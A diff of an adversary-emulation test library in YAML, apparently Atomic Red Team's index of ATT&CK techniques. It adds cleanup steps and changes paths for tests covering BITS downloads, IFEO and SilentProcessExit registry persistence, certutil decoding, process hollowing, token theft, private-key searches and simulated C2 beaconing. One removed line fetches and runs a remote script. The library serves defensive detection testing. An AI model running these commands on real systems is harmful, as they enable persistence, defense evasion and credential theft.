@@ -851,11 +851,14 @@ persistence:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
       executor:
         name: command_prompt
-        command: 'bitsadmin.exe  /transfer /Download /priority Foreground #{remote_file}
+        command: 'bitsadmin.exe /transfer /Download /priority Foreground #{remote_file}
           #{local_file}
+
+'
+        cleanup_command: 'del #{local_file}
 
 '
     - name: Download & Execute via PowerShell BITS
@@ -872,11 +875,14 @@ persistence:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "$env:TEMP\\bitsadmin_flag.ps1"
       executor:
         name: powershell
         command: 'Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination
           #{local_file}
+
+'
+        cleanup_command: 'Remove-Item #{local_file}
 
 '
     - name: Persist, Download, & Execute
@@ -897,7 +903,7 @@ persistence:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
         command_path:
           description: Path of command to execute
           type: path
@@ -905,7 +911,7 @@ persistence:
         command_line:
           description: Command line to execute
           type: string
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
       executor:
         name: command_prompt
         command: |
@@ -1969,7 +1975,7 @@ persistence:
         file_name:
           description: Dll To Inject
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1179\bin\T1179x64.dll
+          default: PathToAtomicsFolder\T1179\bin\T1179x64.dll
         server_name:
           description: TLS Server To Test Get Request
           type: Url
@@ -2160,16 +2166,20 @@ persistence:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: winword.exe
+          default: C:\Windows\System32\calc.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
         command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
+
+'
+        cleanup_command: 'reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
+          File Execution Options\#{target_binary}" /v Debugger /f
 
 '
     - name: IFEO Global Flags
@@ -2182,22 +2192,22 @@ persistence:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: notepad.exe
+          default: C:\Windows\System32\notepad.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
-          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"
-          /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess
-          /d "#{payload_binary}"
-
-'
+        command: |
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /t REG_DWORD /d 1
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "#{payload_binary}"
+        cleanup_command: |
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /f
   T1215:
     technique:
       x_mitre_permissions_required:
@@ -5362,12 +5372,13 @@ defense-evasion:
         elevation_required: true
         command: |
           #list processes by user,
-
           $owners = @{}
           gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
           get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
+
           #Steal Token
-          . .\src\T1134.ps1
+          Set-Location $PathToAtomicsFolder
+          .\T1134\src\T1134.ps1
   '':
     technique:
       x_mitre_data_sources:
@@ -5523,11 +5534,14 @@ defense-evasion:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
       executor:
         name: command_prompt
-        command: 'bitsadmin.exe  /transfer /Download /priority Foreground #{remote_file}
+        command: 'bitsadmin.exe /transfer /Download /priority Foreground #{remote_file}
           #{local_file}
+
+'
+        cleanup_command: 'del #{local_file}
 
 '
     - name: Download & Execute via PowerShell BITS
@@ -5544,11 +5558,14 @@ defense-evasion:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "$env:TEMP\\bitsadmin_flag.ps1"
       executor:
         name: powershell
         command: 'Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination
           #{local_file}
+
+'
+        cleanup_command: 'Remove-Item #{local_file}
 
 '
     - name: Persist, Download, & Execute
@@ -5569,7 +5586,7 @@ defense-evasion:
         local_file:
           description: Local file path to save downloaded file
           type: path
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
         command_path:
           description: Path of command to execute
           type: path
@@ -5577,7 +5594,7 @@ defense-evasion:
         command_line:
           description: Command line to execute
           type: string
-          default: C:\Windows\Temp\bitsadmin_flag.ps1
+          default: "%temp%\\bitsadmin_flag.ps1"
       executor:
         name: command_prompt
         command: |
@@ -5978,7 +5995,7 @@ defense-evasion:
         inf_file_path:
           description: Path to the INF file
           type: path
-          default: T1191.inf
+          default: PathToAtomicsFolder\T1191\src\T1191.inf
       executor:
         name: command_prompt
         elevation_required: false
@@ -5996,7 +6013,7 @@ defense-evasion:
         inf_file_uac:
           description: Path to the INF file
           type: path
-          default: T1191_uacbypass.inf
+          default: PathToAtomicsFolder\T1191\src\T1191_uacbypass.inf
       executor:
         name: command_prompt
         elevation_required: false
@@ -6586,11 +6603,11 @@ defense-evasion:
         cpl_file_path:
           description: path to cpl file
           type: path
-          default: calc.cpl
+          default: PathToAtomicsFolder\T1196\bin\calc.cpl
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'control.exe  #{cpl_file_path}
+        command: 'control.exe #{cpl_file_path}
 
 '
   T1207:
@@ -6933,13 +6950,16 @@ defense-evasion:
         executable:
           description: name of executable
           type: path
-          default: c:\file.exe
+          default: C:\Windows\System32\calc.exe
       executor:
         name: command_prompt
         elevation_required: false
         command: |
-          certutil.exe -encode #{executable} file.txt
-          certutil.exe -decode file.txt #{executable}
+          certutil -encode #{executable} %temp%\T1140_calc.txt
+          certutil -decode %temp%\T1140_calc.txt %temp%T1140_calc_decoded.exe
+        cleanup_command: |
+          del %temp%\T1140_calc.txt
+          del %temp%T1140_calc_decoded.exe
     - name: Certutil Rename and Decode
       description: 'Rename certutil and decode a file. This is in reference to latest
         research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)
@@ -6951,13 +6971,16 @@ defense-evasion:
         executable:
           description: name of executable/file to decode
           type: path
-          default: c:\file.exe
+          default: C:\Windows\System32\calc.exe
       executor:
         name: command_prompt
         elevation_required: false
         command: |
-          cmd.exe /c copy %windir%\\system32\\certutil.exe %temp%tcm.tmp
-          cmd.exe /c %temp%tcm.tmp -decode #{executable} file.txt
+          copy %windir%\system32\certutil.exe %temp%\tcm.tmp
+          %temp%\tcm.tmp -decode #{executable} %temp%\T1140.txt
+        cleanup_command: |
+          del %temp%\tcm.tmp
+          del %temp%\T1140.txt
   T1089:
     technique:
       x_mitre_data_sources:
@@ -8443,14 +8466,13 @@ defense-evasion:
         powershell_process_name:
           description: Name of the created process
           type: string
-          default: calculator
+          default: calc
       executor:
         name: powershell
         elevation_required: false
         command: 'Start-Process #{powershell_command}
 
 '
-        cleanup_command: Stop-Process -Name "#{powershell_process_name}"
   T1183:
     technique:
       x_mitre_data_sources:
@@ -8547,16 +8569,20 @@ defense-evasion:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: winword.exe
+          default: C:\Windows\System32\calc.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
         command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
+
+'
+        cleanup_command: 'reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
+          File Execution Options\#{target_binary}" /v Debugger /f
 
 '
     - name: IFEO Global Flags
@@ -8569,22 +8595,22 @@ defense-evasion:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: notepad.exe
+          default: C:\Windows\System32\notepad.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
-          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"
-          /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess
-          /d "#{payload_binary}"
-
-'
+        command: |
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /t REG_DWORD /d 1
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "#{payload_binary}"
+        cleanup_command: |
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /f
   T1070:
     technique:
       x_mitre_data_sources:
@@ -10371,6 +10397,89 @@ defense-evasion:
               ~/Library/Preferences
 
           2. Subsequently, follow the steps for adding and running via [Launch Agent](Persistence/Launch_Agent.md)
+  T1093:
+    technique:
+      x_mitre_data_sources:
+      - Process monitoring
+      - API monitoring
+      x_mitre_permissions_required:
+      - User
+      name: Process Hollowing
+      description: 'Process hollowing occurs when a process is created in a suspended
+        state then its memory is unmapped and replaced with malicious code. Similar
+        to [Process Injection](https://attack.mitre.org/techniques/T1055), execution
+        of the malicious code is masked under a legitimate process and may evade defenses
+        and detection analysis. (Citation: Leitch Hollowing) (Citation: Endgame Process
+        Injection July 2017)'
+      id: attack-pattern--1c338d0f-a65e-4073-a5c1-c06878849f21
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: defense-evasion
+      x_mitre_detection: |-
+        Monitoring API calls may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. API calls that unmap process memory, such as ZwUnmapViewOfSection or NtUnmapViewOfSection, and those that can be used to modify memory within another process, such as WriteProcessMemory, may be used for this technique. (Citation: Endgame Process Injection July 2017)
+
+        Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      created: '2017-05-31T21:31:09.815Z'
+      modified: '2018-10-17T00:14:20.652Z'
+      external_references:
+      - external_id: T1093
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1093
+      - description: Leitch, J. (n.d.). Process Hollowing. Retrieved November 12,
+          2014.
+        source_name: Leitch Hollowing
+        url: http://www.autosectools.com/process-hollowing.pdf
+      - description: 'Hosseini, A. (2017, July 18). Ten Process Injection Techniques:
+          A Technical Survey Of Common And Trending Process Injection Techniques.
+          Retrieved December 7, 2017.'
+        source_name: Endgame Process Injection July 2017
+        url: https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
+      x_mitre_defense_bypassed:
+      - Process whitelisting
+      - Whitelisting by file name or path
+      - Signature-based detection
+      - Anti-virus
+      identifier: T1093
+    atomic_tests:
+    - name: Process Hollowing using PowerShell
+      description: |
+        This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.
+        Credit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)
+      supported_platforms:
+      - windows
+      input_arguments:
+        parent_process_name:
+          description: Name of the parent process
+          type: string
+          default: explorer
+        sponsor_binary_path:
+          description: Path of the sponsor binary (executable that will host the binary)
+          type: string
+          default: C:\Windows\System32\calc.exe
+        hollow_binary_path:
+          description: Path of the binary to hollow (executable that will run inside
+            the sponsor)
+          type: string
+          default: C:\Windows\System32\cmd.exe
+        spawnto_process_name:
+          description: Name of the process to spawn
+          type: string
+          default: calc
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          . $PathToAtomicsFolder\T1093\src\Start-Hollow.ps1
+          $ppid=Get-Process #{parent_process_name} | select -expand id
+          Start-Hollow -Sponsor "#{sponsor_binary_path}" -Hollow "#{hollow_binary_path}" -ParentPID $ppid -Verbose
+        cleanup_command: Stop-Process -Name "#{spawnto_process_name}"
   T1055:
     technique:
       x_mitre_permissions_required:
@@ -10719,7 +10828,9 @@ defense-evasion:
         command: |
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library #{source_file}
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{file_name}
-          del #{file_name}
+        cleanup_command: 'del #{file_name}
+
+'
     - name: Regsvs Uninstall Method Call Test
       description: 'Executes the Uninstall Method, No Admin Rights Required, Requires
         SNK
@@ -10745,6 +10856,7 @@ defense-evasion:
           Set-Content key.snk -Value $Content -Encoding Byte
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk #{source_file}
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{file_name}
+        cleanup_command: |
           del #{file_name}
           del key.snk
   T1117:
@@ -12028,7 +12140,7 @@ defense-evasion:
         filename:
           description: Location of the project file
           type: Path
-          default: T1127.csproj
+          default: PathToAtomicsFolder\T1127\T1127.csproj
       executor:
         name: command_prompt
         elevation_required: false
@@ -12453,12 +12565,13 @@ privilege-escalation:
         elevation_required: true
         command: |
           #list processes by user,
-
           $owners = @{}
           gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
           get-process | select processname,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
+
           #Steal Token
-          . .\src\T1134.ps1
+          Set-Location $PathToAtomicsFolder
+          .\T1134\src\T1134.ps1
   T1015:
     technique:
       x_mitre_permissions_required:
@@ -13573,7 +13686,7 @@ privilege-escalation:
         file_name:
           description: Dll To Inject
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1179\bin\T1179x64.dll
+          default: PathToAtomicsFolder\T1179\bin\T1179x64.dll
         server_name:
           description: TLS Server To Test Get Request
           type: Url
@@ -13680,16 +13793,20 @@ privilege-escalation:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: winword.exe
+          default: C:\Windows\System32\calc.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
         command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
           File Execution Options\#{target_binary}" /v Debugger /d "#{payload_binary}"
+
+'
+        cleanup_command: 'reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
+          File Execution Options\#{target_binary}" /v Debugger /f
 
 '
     - name: IFEO Global Flags
@@ -13702,22 +13819,22 @@ privilege-escalation:
         target_binary:
           description: Binary To Attach To
           type: Path
-          default: notepad.exe
+          default: C:\Windows\System32\notepad.exe
         payload_binary:
           description: Binary To Execute
           type: Path
-          default: cmd.exe
+          default: C:\Windows\System32\cmd.exe
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image
-          File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
-          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}"
-          /v ReportingMode /t REG_DWORD /d 1 REG ADD "HKLM\SOFTWARE\Microsoft\Windows
-          NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess
-          /d "#{payload_binary}"
-
-'
+        command: |
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /t REG_DWORD /d 512
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /t REG_DWORD /d 1
+          REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /d "#{payload_binary}"
+        cleanup_command: |
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}" /v GlobalFlag /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v ReportingMode /f
+          reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}" /v MonitorProcess /f
   T1160:
     technique:
       x_mitre_permissions_required:
@@ -16965,7 +17082,7 @@ discovery:
         computer_name:
           description: Computer name to find a mount on.
           type: string
-          default: computer1
+          default: localhost
       executor:
         name: command_prompt
         elevation_required: false
@@ -16982,7 +17099,7 @@ discovery:
         computer_name:
           description: Computer name to find a mount on.
           type: string
-          default: computer1
+          default: localhost
       executor:
         name: powershell
         elevation_required: false
@@ -18450,11 +18567,6 @@ discovery:
 '
       supported_platforms:
       - windows
-      input_arguments:
-        service_name:
-          description: Name of service to start stop, query
-          type: string
-          default: svchost.exe
       executor:
         name: command_prompt
         elevation_required: true
@@ -18462,9 +18574,6 @@ discovery:
           tasklist.exe
           sc query
           sc query state= all
-          sc start #{service_name}
-          sc stop #{service_name}
-          wmic service where (displayname like "#{service_name}") get name
     - name: System Service Discovery - net.exe
       description: 'Enumerates started system services using net.exe and writes them
         to a file. This technique has been used by multiple threat actors.
@@ -19747,7 +19856,7 @@ credential-access:
         file_name:
           description: Dll To Inject
           type: Path
-          default: C:\AtomicRedTeam\atomics\T1179\bin\T1179x64.dll
+          default: PathToAtomicsFolder\T1179\bin\T1179x64.dll
         server_name:
           description: TLS Server To Test Get Request
           type: Url
@@ -20337,7 +20446,6 @@ credential-access:
     - name: Private Keys
       description: |
         Find private keys on the Windows file system.
-
         File extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, pfx, .cer, .p7b, .asc
       supported_platforms:
       - windows
@@ -20347,6 +20455,9 @@ credential-access:
         command: |
           echo "ATOMICREDTEAM" > %windir%\cert.key
           dir c:\ /b /s .key | findstr /e .key
+        cleanup_command: 'del c:\Windows\cert.key
+
+'
     - name: Discover Private SSH Keys
       description: 'Discover private SSH keys on a macOS or Linux system.
 
@@ -20557,7 +20668,7 @@ execution:
         inf_file_path:
           description: Path to the INF file
           type: path
-          default: T1191.inf
+          default: PathToAtomicsFolder\T1191\src\T1191.inf
       executor:
         name: command_prompt
         elevation_required: false
@@ -20575,7 +20686,7 @@ execution:
         inf_file_uac:
           description: Path to the INF file
           type: path
-          default: T1191_uacbypass.inf
+          default: PathToAtomicsFolder\T1191\src\T1191_uacbypass.inf
       executor:
         name: command_prompt
         elevation_required: false
@@ -20889,11 +21000,11 @@ execution:
         cpl_file_path:
           description: path to cpl file
           type: path
-          default: calc.cpl
+          default: PathToAtomicsFolder\T1196\bin\calc.cpl
       executor:
         name: command_prompt
         elevation_required: false
-        command: 'control.exe  #{cpl_file_path}
+        command: 'control.exe #{cpl_file_path}
 
 '
   T1173:
@@ -21931,7 +22042,9 @@ execution:
         command: |
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library #{source_file}
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{file_name}
-          del #{file_name}
+        cleanup_command: 'del #{file_name}
+
+'
     - name: Regsvs Uninstall Method Call Test
       description: 'Executes the Uninstall Method, No Admin Rights Required, Requires
         SNK
@@ -21957,6 +22070,7 @@ execution:
           Set-Content key.snk -Value $Content -Encoding Byte
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk #{source_file}
           C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{file_name}
+        cleanup_command: |
           del #{file_name}
           del key.snk
   T1117:
@@ -23330,7 +23444,7 @@ execution:
         filename:
           description: Location of the project file
           type: Path
-          default: T1127.csproj
+          default: PathToAtomicsFolder\T1127\T1127.csproj
       executor:
         name: command_prompt
         elevation_required: false
@@ -25096,34 +25210,17 @@ collection:
       modified: '2019-06-18T13:16:53.385Z'
       identifier: T1123
     atomic_tests:
-    - name: SourceRecorder via Windows command prompt
-      description: 'Create a file called test.wma, with the duration of 30 seconds
-
-'
-      supported_platforms:
-      - windows
-      input_arguments:
-        output_file:
-          description: Path to the recording file being captured
-          type: Path
-          default: test.wma
-        duration_hms:
-          description: Duration of audio to be recorded (in h:m:s format)
-          type: Path
-          default: 30
-      executor:
-        name: command_prompt
-        elevation_required: false
-        command: 'SoundRecorder /FILE #{output_file} /DURATION #{duration_hms}
-
-'
-    - name: PowerShell Cmdlet via Windows command prompt
+    - name: using device audio capture commandlet
       description: "[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)\n"
       supported_platforms:
       - windows
       executor:
-        name: command_prompt
+        name: powershell
         elevation_required: false
+        prereq_command: 'if(Get-Command WindowsAudioDevice-Powershell-Cmdlet -errorAction
+          SilentlyContinue) {0} else {1}
+
+'
         command: 'powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet
 
 '
@@ -25296,7 +25393,11 @@ collection:
         elevation_required: false
         command: |
           dir | clip
-          clip < readme.txt
+          echo "T1115" > %temp%\T1115.txt
+          clip < %temp%\T1115.txt
+        cleanup_command: 'del %temp%\T1115.txt
+
+'
     - name: PowerShell
       description: 'Utilize PowerShell to echo a command to clipboard and execute
         it
@@ -25309,7 +25410,7 @@ collection:
         elevation_required: false
         command: |
           echo Get-Process | clip
-          Get-Clipboard | iex
+          iex Get-Clipboard
   T1074:
     technique:
       x_mitre_data_sources:
@@ -25595,18 +25696,21 @@ collection:
 '
       supported_platforms:
       - windows
+      input_arguments:
+        output_file:
+          description: Output file path
+          type: String
+          default: "$home\\desktop\\mail.csv"
       executor:
         name: command_prompt
         elevation_required: false
-        command: |
-          Display email contents in the terminal
-            PS C:\> .\Get-Inbox.ps1
+        command: 'powershell -executionpolicy bypass -command $PathToAtomicsFolder\T1114\Get-Inbox.ps1
+          -file #{output_file}
 
-          Write emails out to a CSV
-            PS C:\> .\Get-Inbox.ps1 -file "mail.csv"
+'
+        cleanup_command: 'del #{output_file}
 
-          Download and Execute
-            "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1114/Get-Inbox.ps1')"
+'
   T1056:
     technique:
       x_mitre_data_sources:
@@ -25948,7 +26052,7 @@ exfiltration:
         prereq_command: 'rar /?
 
 '
-        command: 'rar a -r #{output_file} #{input_path}*{file_extension}
+        command: 'rar a -r #{output_file} #{input_path}*#{file_extension}
 
 '
         cleanup_command: del -f
@@ -26991,7 +27095,7 @@ command-and-control:
       modified: '2019-06-21T15:16:29.198Z'
       identifier: T1071
     atomic_tests:
-    - name: Malicious User Agents
+    - name: Malicious User Agents - Powershell
       description: |
         This test simulates an infected host beaconing to command and control.
         Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
@@ -27010,6 +27114,24 @@ command-and-control:
           Invoke-WebRequest #{domain} -UserAgent "Wget/1.9+cvs-stable (Red Hat modified)" | out-null
           Invoke-WebRequest #{domain} -UserAgent "Opera/8.81 (Windows NT 6.0; U; en)" | out-null
           Invoke-WebRequest #{domain} -UserAgent "*<|>*" | out-null
+    - name: Malicious User Agents - CMD
+      description: |
+        This test simulates an infected host beaconing to command and control.
+        Inspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat
+      supported_platforms:
+      - windows
+      input_arguments:
+        domain:
+          description: Default domain to simulate against
+          type: string
+          default: www.google.com
+      executor:
+        name: command_prompt
+        command: |
+          curl -s -A "HttpBrowser/1.0" -m3 #{domain}
+          curl -s -A "Wget/1.9+cvs-stable (Red Hat modified)" -m3 #{domain}
+          curl -s -A "Opera/8.81 (Windows NT 6.0; U; en)" -m3 #{domain}
+          curl -s -A "*<|>*" -m3 #{domain}
     - name: Malicious User Agents - Nix
       description: |
         This test simulates an infected host beaconing to command and control.
